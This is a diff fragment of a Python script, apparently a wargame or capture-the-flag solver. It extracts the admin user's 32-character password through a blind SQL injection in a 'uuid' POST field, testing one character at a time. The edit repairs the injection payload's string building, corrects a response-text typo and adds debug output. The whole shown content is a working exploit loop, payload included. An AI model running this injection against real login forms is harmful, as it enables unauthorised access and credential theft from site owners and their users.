@@ -10,10 +10,12 @@ length=32
 
 for i in range (1,length+1) :
     for j in chr_list :
-        params = {"uuid" : "admin' and if(substr(pw,i,1) in str(hex(ord(j))),1,0)#","pw":""}
+        params = {"uuid":"admin' and if(substr(pw,"+str(i)+",1)in("+hex(ord(j))+"),1,0)#","pw":""}
         req = requests.post(url,data=params,cookies=cookies)
-
-        if((req.text).find("Wrong passsword!")>0):
+        print("i: "+ str(i)+" char:"+j)
+        print("url: "+url,end="\n")
+        if((req.text).find("Wrong password!")>0):
+            print("The %dth Letter is "%i+j)
             result += j
             break
 
